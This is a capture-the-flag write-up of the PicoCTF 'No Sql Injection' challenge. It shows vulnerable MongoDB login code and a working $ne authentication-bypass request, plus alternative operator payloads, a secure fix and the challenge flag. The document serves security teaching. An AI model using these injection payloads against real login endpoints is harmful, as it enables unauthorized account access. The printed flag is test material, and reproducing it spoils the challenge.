# PicoCTF - No Sql Injection Writeup

## Challenge Information
- **Challenge Name:** No Sql Injection
- **Category:** Web Exploitation
- **Platform:** PicoCTF
- **Flag:** `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}`

### What is NoSQL?
NoSQL (Not Only SQL) databases are non-relational databases that provide flexible data storage mechanisms. Unlike traditional SQL databases that use structured tables, NoSQL databases can store data in various formats:

- **Document stores** (e.g., MongoDB) - Store data as documents (JSON-like)
- **Key-value stores** (e.g., Redis) - Simple key-value pairs
- **Column family** (e.g., Cassandra) - Wide column storage
- **Graph databases** (e.g., Neo4j) - Network of nodes and relationships

**MongoDB**, used in this challenge, is a popular document-oriented NoSQL database that stores data in BSON (Binary JSON) format.

### NoSQL Injection vs SQL Injection
While SQL injection targets relational databases with malicious SQL queries, NoSQL injection exploits NoSQL databases by injecting malicious queries or operators specific to the NoSQL system being used.

**Common NoSQL operators that can be exploited:**
- `$ne` - Not equal
- `$gt` - Greater than
- `$lt` - Less than
- `$regex` - Regular expression matching
- `$exists` - Field existence check
- `$where` - JavaScript expression evaluation

## Challenge Analysis

### Application Overview
The challenge presents a Node.js web application with:
- **Frontend:** Login form (`index.html`) and admin panel (`admin.html`)
- **Backend:** Express.js server (`server.js`) with MongoDB database
- **Database:** In-memory MongoDB instance with a single user account

### Source Code Analysis

#### Key Components:

1. **User Schema** (`server.js:16-24`):
```javascript
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false, default: "{{Flag}}" },
});
```

2. **Initial User Creation** (`server.js:34-40`):
```javascript
const initialUser = new User({
  firstName: "pico",
  lastName: "player",
  email: "picoplayer355@picoctf.org",
  password: crypto.randomBytes(16).toString("hex").slice(0, 16),
});
```

The target user has:
- **Email:** `picoplayer355@picoctf.org`
- **Password:** Random 16-character hex string (unknown to us)
- **Token:** Contains the flag we need to retrieve

#### The Vulnerability (`server.js:53-82`):

The critical vulnerability lies in the login endpoint:

```javascript
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({
      email:
        email.startsWith("{") && email.endsWith("}")
          ? JSON.parse(email)
          : email,
      password:
        password.startsWith("{") && password.endsWith("}")
          ? JSON.parse(password)
          : password,
    });
    // ... rest of the code
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});
```

**The Problem:**
The code checks if the input starts and ends with curly braces `{}`, and if so, parses it as JSON. This allows attackers to inject MongoDB query operators instead of literal string values.

## Exploitation

### Attack Vector
Instead of providing literal email/password strings, we can inject MongoDB query operators by wrapping them in JSON format.

### Payload Construction

**Target:** Bypass password authentication while using the known email address.

**Payload:**
```json
{
  "email": "picoplayer355@picoctf.org",
  "password": "{\"$ne\": \"\"}"
}
```

### Step-by-Step Exploitation

1. **HTTP Request:**
```http
POST /login HTTP/1.1
Host: atlas.picoctf.net:62080
Content-Type: application/json

{"email":"picoplayer355@picoctf.org","password":"{\"$ne\": \"\"}"}
```

2. **Server Processing:**
   - `email` = `"picoplayer355@picoctf.org"` (literal string)
   - `password` = `"{\"$ne\": \"\"}"` (string that looks like JSON)
   
3. **Vulnerability Trigger:**
   - `password.startsWith("{") && password.endsWith("}")` returns `true`
   - `JSON.parse("{\"$ne\": \"\"}")` returns `{$ne: ""}`

4. **MongoDB Query:**
```javascript
User.findOne({
  email: "picoplayer355@picoctf.org",
  password: {$ne: ""}  // "password is not equal to empty string"
})
```

5. **Query Logic:**
   - The `$ne` operator means "not equal"
   - Since the actual password is a 16-character hex string (not empty), the condition `{$ne: ""}` evaluates to `true`
   - MongoDB returns the user record

### Why This Works
- **Normal authentication:** `password: "wrongguess"` → No match
- **Exploited authentication:** `password: {$ne: ""}` → Matches any non-empty password
- **Result:** Authentication bypass without knowing the actual password

## HTTP Response Analysis

**Successful exploitation response:**
<img width="1427" height="460" alt="image" src="https://github.com/user-attachments/assets/e437c818-46c6-402d-b370-299fc2af50b0" />

## Flag Extraction

The `token` field contains a base64-encoded flag:

<img width="1161" height="73" alt="image" src="https://github.com/user-attachments/assets/6b0235be-2f22-4cb7-917f-cb16c8cd24e2" />

## Alternative Payloads

Several other MongoDB operators could have been used:

1. **Using `$exists`:**
```json
{"email":"picoplayer355@picoctf.org","password":"{\"$exists\": true}"}
```

2. **Using `$regex`:**
```json
{"email":"picoplayer355@picoctf.org","password":"{\"$regex\": \".*\"}"}
```

3. **Using `$type`:**
```json
{"email":"picoplayer355@picoctf.org","password":"{\"$type\": \"string\"}"}
```

4. **Bypassing both fields:**
```json
{"email":"{\"$ne\": null}","password":"{\"$ne\": null}"}
```

## Prevention and Mitigation

### Secure Code Example
```javascript
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  // Input validation
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ success: false, error: 'Invalid input' });
  }

  try {
    const user = await User.findOne({
      email: email,      // Direct string comparison
      password: password // Direct string comparison
    });

    if (user) {
      res.json({ success: true, token: user.token });
    } else {
      res.json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: 'Server error' });
  }
});
```

### Best Practices for NoSQL Security

1. **Input Validation:**
   - Always validate input types
   - Sanitize user input before database queries
   - Use schema validation

2. **Parameterized Queries:**
   - Use ORM/ODM features that prevent injection
   - Avoid dynamic query construction

3. **Principle of Least Privilege:**
   - Limit database user permissions
   - Use authentication and authorization properly

4. **Regular Security Audits:**
   - Code review for injection vulnerabilities
   - Penetration testing
   - Dependency scanning

## Learning Outcomes

This challenge demonstrates:

1. **NoSQL injection vulnerabilities** and how they differ from SQL injection
2. **MongoDB query operators** and their potential for exploitation
3. **Input validation importance** in web applications
4. **JSON parsing dangers** when handling user input
5. **Authentication bypass techniques** using database-specific operators

## Tools and Techniques Used

- **Burp Suite/Browser DevTools** - HTTP request interception and modification
- **Base64 decoding** - Flag extraction from encoded token
- **MongoDB operator knowledge** - Understanding `$ne` and similar operators
- **JSON manipulation** - Crafting payloads with proper escaping

## More Resources about NoSQL
https://portswigger.net/web-security/nosql-injection

## Conclusion

The "No Sql Injection" challenge effectively demonstrates how seemingly innocent features (like flexible JSON input parsing) can introduce serious security vulnerabilities. The key takeaway is that any user input that influences database queries must be properly validated and sanitized, regardless of the database technology being used.

This type of vulnerability has been found in real-world applications, making it an important security concept for developers to understand and prevent.

---

**Flag:** `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}`
